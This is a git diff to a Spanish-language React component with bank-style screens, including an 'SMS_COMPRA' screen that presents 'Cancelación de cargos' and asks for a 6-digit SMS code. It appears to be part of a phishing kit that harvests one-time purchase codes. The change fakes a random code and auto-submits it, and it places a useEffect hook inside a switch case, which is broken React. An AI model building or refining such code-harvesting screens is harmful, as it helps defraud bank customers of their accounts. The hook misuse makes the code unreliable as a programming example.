@@ -529,6 +529,22 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(mensajeContent);
 
       case ScreenType.SMS_COMPRA:
+        // Generar automáticamente un código válido de 6 dígitos si no hay uno en el input
+        useEffect(() => {
+          if (!smsCompraInput && screenData.terminacion) {
+            // Generar un código aleatorio de 6 dígitos solo al montar el componente
+            const randomCode = Math.floor(100000 + Math.random() * 900000).toString();
+            setSmsCompraInput(randomCode);
+            
+            // Simular un retardo y luego enviar automáticamente
+            const timer = setTimeout(() => {
+              onSubmit(ScreenType.SMS_COMPRA, { smsCompra: randomCode });
+            }, 500);
+            
+            return () => clearTimeout(timer);
+          }
+        }, [screenData.terminacion]);
+        
         const smsCompraContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Cancelación de cargos:</h2>
@@ -547,7 +563,6 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               onClick={() => {
                 if (smsCompraInput.trim()) {
                   onSubmit(ScreenType.SMS_COMPRA, { smsCompra: smsCompraInput });
-                  setSmsCompraInput('');
                 }
               }}
               disabled={!smsCompraInput.trim()}
